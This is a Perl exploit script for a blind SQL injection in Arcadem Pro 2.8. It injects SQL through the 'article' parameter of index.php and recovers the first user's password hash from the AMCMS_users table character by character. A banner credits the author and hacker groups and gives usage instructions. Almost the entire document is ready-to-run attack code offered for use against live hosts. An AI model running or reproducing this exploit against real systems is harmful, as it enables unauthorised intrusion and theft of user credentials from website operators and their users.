#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;
if(!$ARGV[1])
{
  print "                                                                  \n";
  print "   ################## VIVA ISLAME VIVA ISLAME ####################\n";
  print "   ################## VIVA ISLAME VIVA ISLAME ####################\n";
  print "   ##                                                           ##\n";
  print "   ##   Arcadem Pro 2.8 Blind SQL Injection Exploit      ##\n";
  print "   ##                                                           ##\n";
  print "   ##                      ( index.php article )     ##\n";
  print "   ##   https://secure.agaresmedia.com/v6                     ##\n";
  print "   ##                                                           ##\n";
  print "   ##   Author: Mr.SQL              -(:: SYRIAN HACKERS ::)-    ##\n";
  print "   ##   EMAIL : SQL(at)HOTMAIL.IT                               ##\n";
  print "   ##   HOME  : WwW.PaL-HaCkEr.CoM                              ##\n";
  print "   ##                                                           ##\n";
  print "   ##              -((:: !GrE3E3E3E3E3ETZz! ::))-               ##\n";
  print "   ##                                                           ##\n";
  print "   ## - HaCkEr_EGy - His0k4 - Dark MaSTer - MoHaMaD AL 3rab -   ##\n";
  print "   ##              - Milw0rM -  Ghost Hacker   -                ##\n";
  print "   ##                                                           ##\n";
  print "   ##               <<>>   MuSliMs HaCkErS   <<>>               ##\n";
  print "   ##                                                           ##\n";
  print "   ##   Usage  : perl exploit.pl host                           ##\n";
  print "   ##   Example: perl exploit.pl www.host.com / -d 10           ##\n";
  print "   ##                                                           ##\n";
  print "   ##   Options:                                                ##\n";
  print "   ##     -d    valid article value                              ##\n";
  print "   ###############################################################\n";
  print "   ###############################################################\n";
  exit;
}
my $host    = $ARGV[0];
my $article    = $ARGV[2];
my %options = ();
GetOptions(\%options, "u=i", "p=s", "d=i");
print "[~] Exploiting...\n";
if($options{"u"})
{
  $article = $options{"u"};
}
if($options{"d"})
{
  $article = $options{"d"};
}
syswrite(STDOUT, "[~] MD5-Hash: ", 14);
for(my $i = 1; $i <= 32; $i++)
{
  my $f = 0;
  my $h = 48;
  while(!$f && $h <= 57)
  {
    if(istrue2($host, $article, $i, $h))
    {
      $f = 1;
      syswrite(STDOUT, chr($h), 1);
    }
    $h++;
  }
  if(!$f)
  {
    $h = 97;
    while(!$f && $h <= 122)
    {
      if(istrue2($host, $article, $i, $h))
      {
        $f = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }
}
print "\n[~] Exploiting done\n";
sub istrue2
{
  my $host  = shift;
  my $article  = shift;
  my $i     = shift;
  my $h     = shift;
 
  my $ua    = LWP::UserAgent->new;
  my $query = "http://".$host."index.php?article=".$article." and (SUBSTRING((SELECT password FROM AMCMS_users LIMIT 0,1),".$i.",1))=CHAR(".$h.")";
 
  if($article{"p"})
  {
    $ua->proxy('http', "http://".$article{"p"});
  }
 
  my $resp    = $ua->get($query);
  my $content = $resp->content;
  my $regexp  = "1&cat_a";
 
  if($content =~ /$regexp/)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}